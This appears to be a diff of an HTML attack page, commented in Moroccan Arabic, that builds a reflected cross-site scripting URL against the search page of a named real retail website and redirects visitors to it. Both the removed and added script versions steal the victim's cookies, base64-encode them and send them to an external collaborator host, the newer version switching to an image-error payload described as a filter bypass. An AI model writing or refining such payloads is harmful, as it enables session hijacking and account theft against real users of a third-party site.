@@ -5,15 +5,15 @@
 </head>
 <body>
     <script>
-        // 1. الكود اللي غيسحب الكوكيز ويصيفطهم لـ Collaborator
-        // استعملنا btoa باش نشفرو الداتا و encodeURIComponent باش نهربو من الـ WAF
-        var payload = "fetch('https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com/?data='+btoa(document.cookie))";
-        
-        // 2. الرابط المعتوب اللي عطيتيني + الكود ديال السحب
-        // هرسنا الـ Tags وزرعنا الـ script اللي كيدير fetch
-        var xssUrl = "https://www.decathlon.com/search?q=</h1></title><script>" + payload + "<\/script>";
+        // 1. هاد الكود كيسحب الكوكيز ويصيفطهم لـ Collaborator
+        var collab = "https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com";
+        var payload = "new Image().src='" + collab + "/?data=' + btoa(document.cookie)";
 
-        // 3. التحويل التلقائي
+        // 2. الرابط المعتوب اللي لقيتي + الـ Bypass
+        // استعملنا <img> حيت كتنفذ الكود فاش كيوقع error فـ الـ src
+        var xssUrl = "https://www.decathlon.com/search?q=</h1></title><img src=x onerror=\"" + payload + "\">";
+
+        // 3. تنفيذ التحويل
         window.location.href = xssUrl;
     </script>
 </body>
